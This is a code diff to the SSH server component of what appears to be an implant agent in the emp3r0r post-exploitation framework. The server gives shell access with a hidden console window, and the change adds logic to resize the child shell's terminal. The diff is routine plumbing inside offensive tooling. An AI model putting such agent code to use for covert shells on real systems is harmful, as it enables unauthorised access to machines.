@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"context"
 	"fmt"
 	"log"
 	"os"
@@ -10,6 +11,8 @@ import (
 	"syscall"
 
 	"github.com/gliderlabs/ssh"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/shirou/gopsutil/v3/process"
 )
 
 // SSHD start a ssh server to provide shell access for clients
@@ -39,6 +42,8 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			HideWindow: true,
 		}
+		ctx, cancel := context.WithCancel(context.Background())
+		defer cancel()
 
 		// console configs
 		ptyReq, winCh, isPTY := s.Pty()
@@ -49,8 +54,29 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			log.Print("Got an SSH request")
 		}
 		go func() {
-			for win := range winCh {
-				setWinsize(win.Width, win.Height)
+			defer cancel()
+			for ctx.Err() == nil {
+				if cmd.Process != nil {
+					win := <-winCh
+					conhost_pid := int32(cmd.Process.Pid)
+					conhost_proc, err := process.NewProcess(conhost_pid)
+					if err != nil {
+						log.Printf("conhost process %d not found", conhost_pid)
+						continue
+					}
+					children, err := conhost_proc.Children()
+					if err != nil {
+						log.Printf("conhost get children: %v", err)
+						return
+					}
+					if len(children) == 0 {
+						log.Print("conhost has no children, shell won't be resized")
+						return
+					}
+					shell_proc := children[0] // there should be only 1 child
+					SetWinsize(int(shell_proc.Pid), win.Width, win.Height)
+				}
+				util.TakeABlink()
 			}
 		}()
 
@@ -68,15 +94,4 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 
 	log.Printf("Starting SSHD on port %s...", port)
 	return ssh.ListenAndServe("127.0.0.1:"+port, nil)
-}
-
-func setWinsize(w, h int) {
-	// kernel32_dll := windows.NewLazySystemDLL("kernel32.dll")
-	// set_console_buffer_size := kernel32_dll.NewProc("SetConsoleScreenBufferSize")
-	//
-	// // screen buffer size
-	// var coord windows.Coord
-	// coord.X = int16(w)
-	// coord.Y = int16(h)
-	//
 }
